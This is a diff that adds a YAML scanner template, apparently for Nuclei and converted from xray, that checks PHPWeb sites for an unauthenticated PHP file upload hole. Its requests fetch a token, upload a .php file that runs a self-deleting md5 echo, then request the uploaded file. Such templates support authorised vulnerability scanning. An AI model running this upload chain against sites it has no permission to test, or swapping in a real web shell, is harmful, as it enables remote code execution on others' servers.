@@ -1,0 +1,82 @@
+id: poc-yaml-phpweb-appplus-php-upload
+
+info:
+  name: poc-yaml-phpweb-appplus-php-upload
+  author: sharecast
+  severity: critical
+  tags: xray-converted,fileupload,ct-416589
+  reference:
+    - https://xz.aliyun.com/t/7053
+
+http:
+  - raw:
+      - |
+        POST /base/post.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        act=appcode
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "k="
+          - "t="
+  - raw:
+      - |
+        POST /base/appplus.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_base(8)}}
+
+        ------WebKitFormBoundary{{rand_base(8)}}
+        Content-Disposition: form-data; name="file"; filename="{{rand_base(8)}}.php"
+        Content-Type: application/octet-stream
+        
+        <?php echo md5({{rand_int(1000, 9999)}});unlink(__FILE__);?>
+        ------WebKitFormBoundary{{rand_base(8)}}
+        Content-Disposition: form-data; name="act"
+        
+        upload
+        ------WebKitFormBoundary{{rand_base(8)}}
+        Content-Disposition: form-data; name="r_size"
+        
+        41
+        ------WebKitFormBoundary{{rand_base(8)}}
+        Content-Disposition: form-data; name="t"
+        
+        {{token}}
+        ------WebKitFormBoundary{{rand_base(8)}}
+        Content-Disposition: form-data; name="m"
+        
+        {{md}}
+        ------WebKitFormBoundary{{rand_base(8)}}
+        Content-Disposition: form-data; name="path"
+        
+        upload
+        ------WebKitFormBoundary{{rand_base(8)}}--
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ".php"
+  - raw:
+      - |
+        GET /upload/{{fname}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
